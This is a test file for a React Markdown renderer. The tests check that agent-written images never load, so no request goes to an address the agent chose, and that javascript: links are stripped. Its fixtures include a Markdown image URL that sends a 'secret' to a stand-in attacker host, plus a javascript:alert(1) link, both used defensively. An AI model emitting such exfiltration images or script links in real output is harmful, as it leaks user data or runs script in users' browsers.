import { describe, expect, it } from "vitest";
import { renderToStaticMarkup } from "react-dom/server";
import ReactMarkdown from "react-markdown";
import { markdownComponents } from "./markdown";

const render = (md: string) => renderToStaticMarkup(<ReactMarkdown components={markdownComponents}>{md}</ReactMarkdown>);

describe("markdownComponents", () => {
  it("an image is never rendered as an <img> (no request to an address chosen by agent output); its alt text is shown", () => {
    const html = render("before ![the chart](https://attacker.example/?d=secret) after");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("attacker.example");
    expect(html).toContain("[image: the chart]");
  });

  it("an image without alt text is still not loaded", () => {
    const html = render("![](https://attacker.example/x.png)");
    expect(html).not.toContain("<img");
    expect(html).toContain("[image]");
  });

  it("a link opens in a new tab without an opener, and a javascript: link is not a link", () => {
    expect(render("[docs](https://example.com/x)")).toContain('href="https://example.com/x" target="_blank" rel="noopener noreferrer"');
    expect(render("[click](javascript:alert(1))")).not.toContain("javascript:");
  });

  it("ordinary Markdown is unaffected", () => {
    expect(render("**bold** and `code`")).toContain("<strong>bold</strong>");
  });
});
